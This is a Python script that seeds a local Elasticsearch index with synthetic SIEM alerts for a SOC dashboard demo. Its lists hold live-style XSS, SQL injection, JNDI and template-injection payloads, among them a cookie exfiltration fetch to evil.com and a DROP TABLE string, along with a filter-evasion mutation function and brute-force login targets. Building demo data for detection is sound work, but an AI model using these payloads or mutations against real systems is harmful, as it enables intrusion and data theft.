from elasticsearch import Elasticsearch
from datetime import datetime, timedelta
import random
import urllib.parse

es = Elasticsearch("http://localhost:9200")

IPS = {
    "tor_exit": ["185.220.101.45", "185.220.101.47", "185.220.101.48", "185.220.101.50"],
    "vpn": ["45.33.32.156", "45.33.32.157", "104.21.45.89"],
    "internal": ["172.18.0.1", "192.168.1.10", "192.168.1.15"],
    "external": ["203.0.113.42", "198.51.100.7", "91.108.4.1", "176.10.99.200"],
    "scanner": ["66.240.205.34", "71.6.158.166", "89.248.167.131"]
}
ALL_IPS = [ip for group in IPS.values() for ip in group]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<details/open/ontoggle=alert(1)>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>",
    "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    "<svg><animatetransform onbegin=alert(1)>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\">><script>alert(1)</script>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
]

IDOR_ENDPOINTS = [
    "/api/Users/{}",
    "/api/Orders/{}",
    "/api/Feedback/{}",
    "/api/BasketItems/{}",
    "/api/Complaints/{}",
    "/rest/user/{}",
    "/api/Products/{}",
]

SQLI_PAYLOADS = [
    "' OR 1=1--",
    "admin'--",
    "' OR '1'='1",
    "1' ORDER BY 10--+",
    "1' UNION SELECT username,password FROM users--",
    "1 AND SLEEP(5)",
    "1 AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT version())))",
    "1' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables--",
    "admin' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--",
    "1'; DROP TABLE users--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    "1'; WAITFOR DELAY '0:0:5'--",
]

AI_MUTATED_PAYLOADS = [
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "&#60;script&#62;alert&#40;1&#41;&#60;/script&#62;",
    "\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
    "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>alert\u00281\u0029</script>",
    "%3Cscript%3E%20alert(1);%20%3C/script%3E",
    "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "${jndi:ldap://malicious.c2.server/Exploit}",
    "${jndi:rmi://192.168.1.10:1099/Object}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "<script>var _0x1234=['ale','rt'];window[_0x1234[0]+_0x1234[1]](1)</script>",
    "';confirm`1`//",
    "<svg><script>alert&#40;1&#41;</script>",
    "%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE",
]

BRUTE_TARGETS = [
    "/rest/user/login",
    "/api/login",
    "/admin/login",
    "/wp-admin/",
    "/phpmyadmin/",
]

BRUTE_USERS = ["admin", "administrator", "root", "user", "test", "guest"]

def apply_mutations(payload):
    mutation = random.randint(0, 4)
    if mutation == 0:
        return payload
    elif mutation == 1:
        return urllib.parse.quote(payload)
    elif mutation == 2:
        return urllib.parse.quote(urllib.parse.quote(payload))
    elif mutation == 3:
        return payload + "%00"
    else:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

def random_time(days_back=7):
    now = datetime.utcnow()
    random_seconds = random.randint(0, days_back * 24 * 3600)
    return (now - timedelta(seconds=random_seconds)).isoformat()

def random_ip(attack_type="external"):
    if attack_type == "tor":
        return random.choice(IPS["tor_exit"])
    elif attack_type == "scanner":
        return random.choice(IPS["scanner"])
    elif attack_type == "internal":
        return random.choice(IPS["internal"])
    return random.choice(ALL_IPS)

def generate_xss_alerts(count=80):
    print(f"[*] Generating {count} XSS alerts...")
    endpoints = [
        "/rest/products/search?q=",
        "/profile?user=",
        "/feedback?msg=",
        "/forum/post?title=",
        "/search?keyword=",
        "/comment?text=",
    ]
    for _ in range(count):
        payload = apply_mutations(random.choice(XSS_PAYLOADS))
        alert = {
            "@timestamp": random_time(),
            "rule": {"type": "XSS", "group": "xss", "id": "100100"},
            "source_ip": random_ip(),
            "url": f"{random.choice(endpoints)}{payload}",
            "method": random.choice(["GET", "POST"]),
            "status_code": random.choice([200, 200, 400, 403]),
            "description": "XSS attempt detected. Suspicious pattern found in request URL.",
            "extra_info": f"payload: {payload[:80]}"
        }
        es.index(index="siem-alerts", document=alert)
    print(f"[✓] {count} XSS alerts created")

def generate_idor_alerts(count=60):
    print(f"[*] Generating {count} IDOR alerts...")
    for _ in range(count):
        endpoint = random.choice(IDOR_ENDPOINTS)
        obj_id = random.randint(1, 100)
        alert = {
            "@timestamp": random_time(),
            "rule": {"type": "IDOR", "group": "idor", "id": "100101"},
            "source_ip": random_ip(),
            "url": endpoint.format(obj_id),
            "method": random.choice(["GET", "PUT", "DELETE"]),
            "status_code": random.choice([200, 200, 401, 403, 404]),
            "description": "Possible IDOR attack. Unauthorized object access detected.",
            "extra_info": f"object_id: {obj_id}, endpoint: {endpoint.split('/')[2]}"
        }
        es.index(index="siem-alerts", document=alert)
    print(f"[✓] {count} IDOR alerts created")

def generate_sqli_alerts(count=50):
    print(f"[*] Generating {count} SQLi alerts...")
    endpoints = [
        "/api/users?id=",
        "/store/item?category=",
        "/login?username=",
        "/search?q=",
        "/filter?sort=",
    ]
    for _ in range(count):
        payload = apply_mutations(random.choice(SQLI_PAYLOADS))
        alert = {
            "@timestamp": random_time(),
            "rule": {"type": "SQLi", "group": "sqli", "id": "100102"},
            "source_ip": random_ip("external"),
            "url": f"{random.choice(endpoints)}{payload}",
            "method": random.choice(["GET", "POST"]),
            "status_code": random.choice([200, 400, 500, 500]),
            "description": "SQL Injection attempt detected in request parameter.",
            "extra_info": f"payload: {payload[:80]}"
        }
        es.index(index="siem-alerts", document=alert)
    print(f"[✓] {count} SQLi alerts created")

def generate_ai_mutated_alerts(count=40):
    print(f"[*] Generating {count} AI_MUTATED_XSS alerts...")
    for _ in range(count):
        payload = random.choice(AI_MUTATED_PAYLOADS)
        entropy = round(random.uniform(4.8, 7.2), 2)
        alert = {
            "@timestamp": random_time(),
            "rule": {"type": "AI_MUTATED_XSS", "group": "ai_mutated_xss", "id": "100500"},
            "source_ip": random_ip("tor"),
            "url": f"/rest/products/search?q={payload}",
            "method": "GET",
            "status_code": random.choice([200, 200, 403]),
            "description": f"Suspected AI-Mutated/Obfuscated Payload. Entropy: {entropy}",
            "extra_info": f"entropy: {entropy}, obfuscation_found: True, bypass_attempted: True"
        }
        es.index(index="siem-alerts", document=alert)
    print(f"[✓] {count} AI_MUTATED_XSS alerts created")

def generate_brute_force_alerts(count=30):
    print(f"[*] Generating {count} Brute Force alerts...")
    for _ in range(count):
        alert = {
            "@timestamp": random_time(),
            "rule": {"type": "Brute Force", "group": "brute_force", "id": "100200"},
            "source_ip": random_ip("scanner"),
            "url": random.choice(BRUTE_TARGETS),
            "method": "POST",
            "status_code": random.choice([401, 401, 401, 403, 200]),
            "description": f"Brute force attack detected. Multiple failed logins for user: {random.choice(BRUTE_USERS)}",
            "extra_info": f"attempts: {random.randint(50, 500)}, target_user: {random.choice(BRUTE_USERS)}"
        }
        es.index(index="siem-alerts", document=alert)
    print(f"[✓] {count} Brute Force alerts created")

if __name__ == "__main__":
    print("=" * 60)
    print("  SENIOR SOC ANALYST DEMO DATA GENERATOR")
    print("  Real-world attack patterns + mutation engine")
    print("=" * 60)

    generate_xss_alerts(80)
    generate_idor_alerts(60)
    generate_sqli_alerts(50)
    generate_ai_mutated_alerts(40)
    generate_brute_force_alerts(30)

    total = 80 + 60 + 50 + 40 + 30
    print(f"\n{'='*60}")
    print(f"[✓] Total alerts generated: {total}")
    print(f"[✓] Attack types: XSS, IDOR, SQLi, AI_MUTATED_XSS, Brute Force")
    print(f"[✓] IP sources: TOR exits, scanners, VPN, internal, external")
    print(f"\nTest in UI:")
    print("  'Show me XSS attempts this week'")
    print("  'How many SQLi attacks this week?'")
    print("  'Did any AI payloads bypass WAF today?'")
    print("  'Generate weekly attack report'")
